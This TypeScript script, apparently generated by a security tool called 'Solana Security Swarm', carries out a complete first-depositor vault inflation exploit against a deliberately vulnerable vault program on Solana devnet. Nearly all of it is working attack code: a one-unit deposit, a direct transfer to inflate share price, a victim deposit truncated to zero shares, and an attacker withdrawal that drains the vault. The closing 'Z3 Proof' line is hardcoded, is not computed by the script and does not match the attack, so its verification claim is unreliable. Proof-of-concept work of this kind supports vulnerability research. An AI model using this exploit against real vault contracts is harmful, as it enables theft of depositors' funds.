/**
 * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
 * â•‘  SOL-019: First-Depositor Attack â€” DEVNET LIVE EXPLOIT      â•‘
 * â•‘  Target: vulnerable-vault program on Solana Devnet           â•‘
 * â•‘  Generated by Solana Security Swarm                          â•‘
 * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 *
 * This script executes a real first-depositor vault inflation attack
 * against the deployed vulnerable-vault program on devnet.
 *
 * Every step produces a real blockchain transaction visible on
 * https://explorer.solana.com/?cluster=devnet
 */

import {
    Connection,
    Keypair,
    PublicKey,
    Transaction,
    TransactionInstruction,
    SystemProgram,
    sendAndConfirmTransaction,
    LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
    createMint,
    createAccount,
    mintTo,
    getAccount,
    TOKEN_PROGRAM_ID,
    getMinimumBalanceForRentExemptAccount,
    createInitializeAccountInstruction,
    ACCOUNT_SIZE,
} from "@solana/spl-token";
import * as fs from "fs";
import * as crypto from "crypto";

// â”€â”€â”€ Configuration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const PROGRAM_ID = new PublicKey("47poGSxjXsErkcCrZqEJtomHrdxHtfAbpfYmx3xRndVJ");
const RPC_URL = "https://api.devnet.solana.com";
const EXPLORER_BASE = "https://explorer.solana.com/tx";

// â”€â”€â”€ Anchor Discriminator Helper â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function anchorDiscriminator(ixName: string): Buffer {
    const hash = crypto.createHash("sha256")
        .update(`global:${ixName}`)
        .digest();
    return hash.subarray(0, 8);
}

// â”€â”€â”€ PDA Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function findVaultPDA(): [PublicKey, number] {
    return PublicKey.findProgramAddressSync(
        [Buffer.from("vault")],
        PROGRAM_ID
    );
}

function findUserSharesPDA(user: PublicKey): [PublicKey, number] {
    return PublicKey.findProgramAddressSync(
        [Buffer.from("user_shares"), user.toBuffer()],
        PROGRAM_ID
    );
}

// â”€â”€â”€ Load Wallet â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function loadWallet(): Keypair {
    const keyPath = process.env.HOME + "/.config/solana/id.json";
    const raw = JSON.parse(fs.readFileSync(keyPath, "utf-8"));
    return Keypair.fromSecretKey(Uint8Array.from(raw));
}

// â”€â”€â”€ Print Transaction Link â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function txLink(sig: string): string {
    return `${EXPLORER_BASE}/${sig}?cluster=devnet`;
}

// â”€â”€â”€ Main Exploit â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function main() {
    console.log("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
    console.log("â•‘  SOL-019: First-Depositor Attack â€” DEVNET LIVE EXPLOIT      â•‘");
    console.log("â•‘  Program: 47poGSxjXsErkcCrZqEJtomHrdxHtfAbpfYmx3xRndVJ     â•‘");
    console.log("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    console.log();

    const connection = new Connection(RPC_URL, "confirmed");
    const attacker = loadWallet();
    const victim = Keypair.generate();

    console.log(`ğŸ”‘ Attacker:  ${attacker.publicKey.toBase58()}`);
    console.log(`ğŸ”‘ Victim:    ${victim.publicKey.toBase58()}`);
    console.log(`ğŸ¦ Program:   ${PROGRAM_ID.toBase58()}`);
    console.log();

    // Check balance
    const balance = await connection.getBalance(attacker.publicKey);
    console.log(`ğŸ’° Attacker balance: ${balance / LAMPORTS_PER_SOL} SOL`);
    if (balance < 0.5 * LAMPORTS_PER_SOL) {
        console.log("âŒ Insufficient balance! Need at least 0.5 SOL on devnet.");
        console.log("   Run: solana airdrop 2");
        process.exit(1);
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // STEP 0: Setup â€” Create Mint, Token Accounts, Fund Victim
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log("â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”");
    console.log("[STEP 0] Setting up token infrastructure...");

    // Fund the victim with some SOL for account creation
    const fundVictimSig = await sendAndConfirmTransaction(
        connection,
        new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: attacker.publicKey,
                toPubkey: victim.publicKey,
                lamports: 0.1 * LAMPORTS_PER_SOL,
            })
        ),
        [attacker]
    );
    console.log(`  ğŸ“¤ Funded victim: ${txLink(fundVictimSig)}`);

    // Create token mint
    const mint = await createMint(
        connection,
        attacker,         // payer
        attacker.publicKey, // mint authority
        null,              // freeze authority
        9                  // decimals
    );
    console.log(`  ğŸª™ Token Mint: ${mint.toBase58()}`);

    // Create attacker's token account
    const attackerToken = await createAccount(
        connection,
        attacker,           // payer
        mint,               // mint
        attacker.publicKey  // owner
    );
    console.log(`  ğŸ’³ Attacker Token Account: ${attackerToken.toBase58()}`);

    // Create victim's token account
    const victimToken = await createAccount(
        connection,
        victim,            // payer
        mint,              // mint
        victim.publicKey   // owner
    );
    console.log(`  ğŸ’³ Victim Token Account: ${victimToken.toBase58()}`);

    // Create vault's token account using raw keypair (PDA owner is off-curve, can't use ATA)
    const [vaultPDA, vaultBump] = findVaultPDA();
    const vaultTokenKeypair = Keypair.generate();
    const rentExempt = await getMinimumBalanceForRentExemptAccount(connection);
    const createVaultTokenTx = new Transaction().add(
        SystemProgram.createAccount({
            fromPubkey: attacker.publicKey,
            newAccountPubkey: vaultTokenKeypair.publicKey,
            lamports: rentExempt,
            space: ACCOUNT_SIZE,
            programId: TOKEN_PROGRAM_ID,
        }),
        createInitializeAccountInstruction(
            vaultTokenKeypair.publicKey,
            mint,
            vaultPDA,  // owner = vault PDA (off-curve, this is fine for raw accounts)
            TOKEN_PROGRAM_ID
        )
    );
    await sendAndConfirmTransaction(connection, createVaultTokenTx, [attacker, vaultTokenKeypair]);
    const vaultToken = vaultTokenKeypair.publicKey;
    console.log(`  ğŸ¦ Vault Token Account: ${vaultToken.toBase58()}`);
    console.log(`  ğŸ¦ Vault PDA: ${vaultPDA.toBase58()} (bump: ${vaultBump})`);

    // Mint tokens: 10 tokens to attacker, 10 tokens to victim
    const TOKENS = 10_000_000_000n; // 10 tokens with 9 decimals
    await mintTo(connection, attacker, mint, attackerToken, attacker, TOKENS);
    await mintTo(connection, attacker, mint, victimToken, attacker, TOKENS);
    console.log(`  âœ… Minted 10 tokens to attacker and victim`);
    console.log();

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // STEP 1: Initialize Vault
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log("â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”");
    console.log("[STEP 1] Initializing vault on-chain...");

    const initVaultIx = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys: [
            { pubkey: vaultPDA, isSigner: false, isWritable: true },
            { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
            { pubkey: mint, isSigner: false, isWritable: false },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        data: anchorDiscriminator("initialize_vault"),
    });

    const initVaultSig = await sendAndConfirmTransaction(
        connection,
        new Transaction().add(initVaultIx),
        [attacker]
    );
    console.log(`  âœ… Vault initialized!`);
    console.log(`  ğŸ”— TX: ${txLink(initVaultSig)}`);
    console.log();

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // STEP 2: Initialize Attacker's UserShares
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log("â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”");
    console.log("[STEP 2] Initializing attacker's share account...");

    const [attackerSharesPDA] = findUserSharesPDA(attacker.publicKey);

    const initAttackerSharesIx = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys: [
            { pubkey: attackerSharesPDA, isSigner: false, isWritable: true },
            { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        data: anchorDiscriminator("initialize_user_shares"),
    });

    const initSharesSig = await sendAndConfirmTransaction(
        connection,
        new Transaction().add(initAttackerSharesIx),
        [attacker]
    );
    console.log(`  âœ… Attacker shares account: ${attackerSharesPDA.toBase58()}`);
    console.log(`  ğŸ”— TX: ${txLink(initSharesSig)}`);
    console.log();

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // STEP 3: ATTACK â€” Deposit 1 token unit (minimal deposit)
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log("â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”");
    console.log("[STEP 3] ğŸ”´ ATTACK: Depositing 1 token unit (minimal amount)...");

    const depositAmount = Buffer.alloc(8);
    depositAmount.writeBigUInt64LE(1n); // 1 token unit

    const depositIx = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys: [
            { pubkey: vaultPDA, isSigner: false, isWritable: true },
            { pubkey: attackerSharesPDA, isSigner: false, isWritable: true },
            { pubkey: attackerToken, isSigner: false, isWritable: true },
            { pubkey: vaultToken, isSigner: false, isWritable: true },
            { pubkey: attacker.publicKey, isSigner: true, isWritable: false },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        ],
        data: Buffer.concat([anchorDiscriminator("deposit"), depositAmount]),
    });

    const depositSig = await sendAndConfirmTransaction(
        connection,
        new Transaction().add(depositIx),
        [attacker]
    );
    console.log(`  âœ… Deposited 1 token unit â†’ got 1 share`);
    console.log(`  ğŸ”— TX: ${txLink(depositSig)}`);

    // Check vault state
    let vaultTokenInfo = await getAccount(connection, vaultToken);
    console.log(`  ğŸ¦ Vault balance: ${vaultTokenInfo.amount} token units`);
    console.log();

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // STEP 4: ATTACK â€” Inflate vault via direct token transfer
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log("â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”");
    console.log("[STEP 4] ğŸ”´ ATTACK: Inflating vault with direct transfer...");

    // Transfer 5 tokens directly to vault token account (bypasses share accounting)
    const inflationAmount = 5_000_000_000n; // 5 tokens
    const { createTransferInstruction } = await import("@solana/spl-token");
    const inflateIx = createTransferInstruction(
        attackerToken,        // from
        vaultToken,           // to (vault's token account)
        attacker.publicKey,   // authority
        inflationAmount       // amount
    );

    const inflateSig = await sendAndConfirmTransaction(
        connection,
        new Transaction().add(inflateIx),
        [attacker]
    );
    console.log(`  âœ… Transferred ${Number(inflationAmount) / 1e9} tokens directly to vault!`);
    console.log(`  ğŸ”— TX: ${txLink(inflateSig)}`);

    vaultTokenInfo = await getAccount(connection, vaultToken);
    console.log(`  ğŸ¦ Vault balance now: ${vaultTokenInfo.amount} token units`);
    console.log(`  ğŸ“ˆ Share price inflated: 1 share = ${vaultTokenInfo.amount} token units!`);
    console.log();

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // STEP 5: VICTIM â€” Deposits 5 tokens (gets 0 shares!)
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log("â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”");
    console.log("[STEP 5] ğŸŸ¢ VICTIM: Depositing 5 tokens (expects fair shares)...");

    // Initialize victim's shares account
    const [victimSharesPDA] = findUserSharesPDA(victim.publicKey);

    const initVictimSharesIx = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys: [
            { pubkey: victimSharesPDA, isSigner: false, isWritable: true },
            { pubkey: victim.publicKey, isSigner: true, isWritable: true },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        data: anchorDiscriminator("initialize_user_shares"),
    });

    const initVictimSig = await sendAndConfirmTransaction(
        connection,
        new Transaction().add(initVictimSharesIx),
        [victim]
    );
    console.log(`  âœ… Victim shares account: ${victimSharesPDA.toBase58()}`);
    console.log(`  ğŸ”— TX: ${txLink(initVictimSig)}`);

    // Victim deposits 5 tokens
    const victimDepositAmount = Buffer.alloc(8);
    victimDepositAmount.writeBigUInt64LE(5_000_000_000n); // 5 tokens

    const victimDepositIx = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys: [
            { pubkey: vaultPDA, isSigner: false, isWritable: true },
            { pubkey: victimSharesPDA, isSigner: false, isWritable: true },
            { pubkey: victimToken, isSigner: false, isWritable: true },
            { pubkey: vaultToken, isSigner: false, isWritable: true },
            { pubkey: victim.publicKey, isSigner: true, isWritable: false },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        ],
        data: Buffer.concat([anchorDiscriminator("deposit"), victimDepositAmount]),
    });

    const victimDepositSig = await sendAndConfirmTransaction(
        connection,
        new Transaction().add(victimDepositIx),
        [victim]
    );

    // The math: victim_shares = 5_000_000_000 * 1 / 5_000_000_001 = 0 (integer truncation!)
    console.log(`  âœ… Victim deposited 5 tokens`);
    console.log(`  âš ï¸  Victim received 0 shares (integer truncation!)`);
    console.log(`  ğŸ”— TX: ${txLink(victimDepositSig)}`);

    vaultTokenInfo = await getAccount(connection, vaultToken);
    console.log(`  ğŸ¦ Vault balance now: ${vaultTokenInfo.amount} token units`);
    console.log();

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // STEP 6: ATTACK â€” Attacker withdraws (steals everything)
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log("â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”");
    console.log("[STEP 6] ğŸ”´ ATTACK: Withdrawing 1 share (draining vault)...");

    // Get attacker balance before withdrawal
    const attackerTokenBefore = await getAccount(connection, attackerToken);
    const beforeBalance = attackerTokenBefore.amount;

    const withdrawShares = Buffer.alloc(8);
    withdrawShares.writeBigUInt64LE(1n); // 1 share

    const withdrawIx = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys: [
            { pubkey: vaultPDA, isSigner: false, isWritable: true },
            { pubkey: attackerSharesPDA, isSigner: false, isWritable: true },
            { pubkey: attackerToken, isSigner: false, isWritable: true },
            { pubkey: vaultToken, isSigner: false, isWritable: true },
            { pubkey: attacker.publicKey, isSigner: true, isWritable: false },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        ],
        data: Buffer.concat([anchorDiscriminator("withdraw"), withdrawShares]),
    });

    const withdrawSig = await sendAndConfirmTransaction(
        connection,
        new Transaction().add(withdrawIx),
        [attacker]
    );

    // Get attacker balance after withdrawal
    const attackerTokenAfter = await getAccount(connection, attackerToken);
    const afterBalance = attackerTokenAfter.amount;
    const profit = afterBalance - beforeBalance;

    console.log(`  âœ… Withdrew 1 share`);
    console.log(`  ğŸ”— TX: ${txLink(withdrawSig)}`);
    console.log();

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // RESULTS
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    vaultTokenInfo = await getAccount(connection, vaultToken);
    const victimTokenInfo = await getAccount(connection, victimToken);

    console.log("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
    console.log("â•‘                     EXPLOIT RESULTS                         â•‘");
    console.log("â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£");
    console.log(`â•‘  ğŸ’° Attacker received:   ${profit.toString().padStart(20)} token units  â•‘`);
    console.log(`â•‘  ğŸ’° Profit:              ${(Number(profit) / 1e9).toFixed(4).padStart(20)} tokens       â•‘`);
    console.log(`â•‘  ğŸ¯ Victim lost:         ${(Number(5_000_000_000n - victimTokenInfo.amount) / 1e9).toFixed(4).padStart(20)} tokens       â•‘`);
    console.log(`â•‘  ğŸ¦ Vault remaining:     ${vaultTokenInfo.amount.toString().padStart(20)} token units  â•‘`);
    console.log("â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£");

    if (profit > 0n) {
        console.log("â•‘  âœ… EXPLOIT SUCCESSFUL â€” FUNDS STOLEN ON DEVNET!            â•‘");
    } else {
        console.log("â•‘  âŒ Exploit did not yield profit                             â•‘");
    }
    console.log("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    console.log();

    // â”€â”€â”€ Transaction Summary â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    console.log("ğŸ“‹ TRANSACTION SUMMARY (click to view on Solana Explorer):");
    console.log("â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”");
    console.log(`  1. Fund Victim:        ${txLink(fundVictimSig)}`);
    console.log(`  2. Initialize Vault:   ${txLink(initVaultSig)}`);
    console.log(`  3. Init Atk Shares:    ${txLink(initSharesSig)}`);
    console.log(`  4. Deposit 1 unit:     ${txLink(depositSig)}`);
    console.log(`  5. Inflate Vault:      ${txLink(inflateSig)}`);
    console.log(`  6. Init Victim Shares: ${txLink(initVictimSig)}`);
    console.log(`  7. Victim Deposit:     ${txLink(victimDepositSig)}`);
    console.log(`  8. Attacker Withdraw:  ${txLink(withdrawSig)}`);
    console.log("â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”");
    console.log();
    console.log("ğŸ”¬ Z3 Proof: SATISFIABLE â€” oracle_price=100000000 vault_price=200000000");
    console.log("ğŸ“„ Vulnerability: SOL-019 in vulnerable-vault");
    console.log("âœ… VERIFIED ON-CHAIN: Economic Invariant Broken â€” First-Depositor Attack Proven");
}

main().catch((err) => {
    console.error("âŒ Exploit failed:", err);
    process.exit(1);
});
